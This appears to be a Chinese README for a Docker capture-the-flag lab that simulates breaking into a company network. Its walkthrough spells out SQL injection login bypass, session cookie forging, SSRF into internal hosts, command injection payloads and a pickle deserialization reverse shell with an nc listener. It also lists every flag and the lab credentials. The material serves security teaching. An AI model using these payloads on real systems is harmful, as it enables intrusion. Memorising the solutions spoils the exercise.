# 🧪 BioHazard CTF Lab — 「生化公司」内网渗透实训靶场

> 剧情：你是一名白帽雇佣兵，接悬赏入侵"生化公司"内网。
> 目标：从 Web 入口一路打通到内网域控，收集全部 flag。
> 本靶场**完全复刻**了经典 CTF 教程视频的完整攻击链，用于合法学习。

---

## 🗺️ 靶场架构

```
宿主机 (你的电脑)
└── 内网 172.20.0.0/24 (docker bridge)
    ├── web    (172.20.0.10 :80)  ←── 唯一暴露的入口 (含全部 Web 漏洞)
    ├── mysql  (172.20.0.20 :3306)  ← 数据库 (flag#2)
    ├── backup (172.20.0.30 :8080)  ← 内网备份 (flag#3 + 域控凭据)
    └── dc     (172.20.0.40 :389)   ← 域控 (flag#4)
```

> 💡 **设计巧思**：mysql/backup/dc **都不暴露端口**给宿主机，
> 想拿 flag#3/#4 就必须利用 web 上的 SSRF 漏洞"跳板"进入内网，
> 这正是真实内网渗透的典型打法。

---

## 🚀 快速开始

**前置要求**：安装 Docker + Docker Compose（`docker compose version` 检查）

```bash
git clone <你的仓库地址> biohazard-ctf
cd biohazard-ctf
docker compose up -d --build     # 一键启动靶场
```

打开浏览器访问：**http://localhost**  →  开始你的渗透之旅！

**重置靶场**：`docker compose down -v && docker compose up -d --build`

---

## 🎯 通关攻略（7 个关卡，由易到难）

| 关卡 | 漏洞类型 | Flag | 位置 |
|---|---|---|---|
| 1 | 调试接口信息泄露 | `flag#1` | `/debug_info` |
| 2 | SQL 注入绕过登录 + 后台越权 | `flag#2` | `/admin` |
| 3 | 源码泄露（硬编码密钥）+ 路由枚举 | — | `/source` `/api/routes` |
| 4 | SSRF 访问内网 backup | `flag#3` | `/api/fetch?url=...` |
| 5 | 命令注入 | — | `/api/ping?ip=...` |
| 6 | pickle 反序列化 RCE | — | `/api/deserialize` |
| 7 | 内网横向移动 → 域控 | `flag#4` | `/api/fetch → dc/auth` |

### 📖 详细思路（卡住了再看）

<details>
<summary><b>关卡1 信息收集</b>（点击展开）</summary>

- 先扫端口：`nmap -sS -p- <靶机IP>` → 发现只有 80 开放
- 目录爆破：`dirsearch -u http://<靶机IP>` → 发现 `robots.txt`、`/login`、`/debug_info`
- 访问 `/robots.txt` 拿提示，然后直接 curl `/debug_info`：
  ```bash
  curl http://<靶机IP>/debug_info    # 🏁 flag#1 + MySQL地址 + 内网网段
  ```
</details>

<details>
<summary><b>关卡2 SQL注入绕过登录</b>（点击展开）</summary>

登录接口直接把输入拼进 SQL，万能密码绕过：
```bash
curl -c cookie.txt -X POST -d "username=' OR '1'='1' -- &password=x" http://<靶机IP>/login
curl -b cookie.txt http://<靶机IP>/admin     # 🏁 flag#2
```
> 小提示：默认有弱口令 `admin / admin@123`，试试直接登录？
</details>

<details>
<summary><b>关卡3 源码泄露 + 弱密钥</b>（点击展开）</summary>

- 访问 `/source` 看源码 → 找到硬编码密钥 `Th1s_1s_N0t_Th3_Rea1_K3y`
- 访问 `/api/routes` 枚举隐藏路由 → 发现 `/api/fetch` `/api/ping` `/api/deserialize`
- 可以用密钥伪造管理员 cookie（Flask session 只签名不加密）：
  ```bash
  # 用 flask-unsign 或写脚本签名 {"role":"admin"}
  flask-unsign --sign --cookie "{'role':'admin'}" --secret "Th1s_1s_N0t_Th3_Rea1_K3y"
  ```
</details>

<details>
<summary><b>关卡4 SSRF 打内网 backup</b>（点击展开）</summary>

`/api/fetch` 接口会帮你请求任意 URL —— 用它当跳板访问内网：
```bash
curl "http://<靶机IP>/api/fetch?url=http://backup:8080/"
curl "http://<靶机IP>/api/fetch?url=http://backup:8080/archives/core_backup.txt"  # 🏁 flag#3
curl "http://<靶机IP>/api/fetch?url=http://backup:8080/secrets/dc_creds.txt"      # 🔑 域控凭据
```
</details>

<details>
<summary><b>关卡5 命令注入</b>（点击展开）</summary>

```bash
curl "http://<靶机IP>/api/ping?ip=127.0.0.1;id"     # 看到 uid= 说明注入成功
curl "http://<靶机IP>/api/ping?ip=127.0.0.1;whoami"
```
</details>

<details>
<summary><b>关卡6 pickle 反序列化 RCE</b>（点击展开）</summary>

`/api/deserialize` 直接 `pickle.loads()` 用户输入，构造 payload：
```bash
# 本仓库提供了生成脚本: python3 scripts/solvers/gen_pickle.py
# 演示版(回显输出):
curl -X POST -d "data=<base64 payload>" http://<靶机IP>/api/deserialize

# 反弹shell版: 攻击机先 nc -lvnp 4444, 再发送 payload (见 gen_pickle.py --reverse)
```
</details>

<details>
<summary><b>关卡7 横向移动打域控</b>（点击展开）</summary>

拿到的域控凭据 `svc_dc / S3rv1c3_P@ss!_2026`，走 SSRF 认证域控：
```bash
curl "http://<靶机IP>/api/fetch?url=http://dc:389/auth?user=svc_dc&pass=S3rv1c3_P@ss!_2026"
# 🏁 flag#4
```
> 更专业的玩法：先用 pickle 弹 shell 进 web 容器，再从容器内网 nmap 扫 172.20.0.0/24，
> 发现 dc，直接内网访问 —— 这才是真实横向移动的完整操作。
</details>

---

## 🏁 Flag 一览

```
flag#1  flag{0pen_D3bug_1s_D4ng3r0us}
flag#2  flag{C0ngr4ts_Y0u_R34d_DB}
flag#3  flag{B4ckup_0f_Th3_Und3ad}
flag#4  flag{D0m41n_C0ntr0ll3r_0wn3d}
```
> 详情见 `flags/flags.txt`（建议通关后再看 😉）

---

## 📂 目录结构

```
biohazard-ctf/
├── docker-compose.yml     # 一键编排(web/mysql/backup/dc)
├── web/                   # 漏洞主应用(Flask)
│   ├── app.py             # 全部 Web 漏洞 (故意为之!)
│   ├── Dockerfile
│   └── requirements.txt
├── mysql/init.sql         # 建库 + flag#2 + 弱口令账号
├── backup/                # 内网备份服务 (flag#3 + 域控凭据)
├── dc/                    # 模拟域控 (flag#4)
├── scripts/
│   ├── attacker.sh        # 一键通关演示脚本
│   ├── test_all.py        # 集成测试(自动验证整条攻击链)
│   └── solvers/
│       └── gen_pickle.py  # pickle RCE payload 生成器
└── flags/flags.txt        # 通关答案
```

---

## ⚠️ 安全声明

- 本靶场**只允许在本地/Docker 隔离环境中运行**，请勿部署到公网
- Flag 与漏洞全部为虚构场景，未授权对真实系统进行渗透测试属违法行为
- 本项目仅供网络安全教学与研究使用

---

## 🗓️ 路线图 (v2 规划)

- [ ] **攻防可视化面板**：网页版攻击链图谱 + 关卡进度追踪 + 实时提示
- [ ] 更多漏洞类型：文件上传、XXE、JWT 伪造、目录穿越
- [ ] 多剧情模式：生化公司 → 银行 → 军工
- [ ] 计分板 + 排名

---

## 📄 License

MIT — 自由使用、修改、教学。Star ⭐ 是对作者最大的鼓励！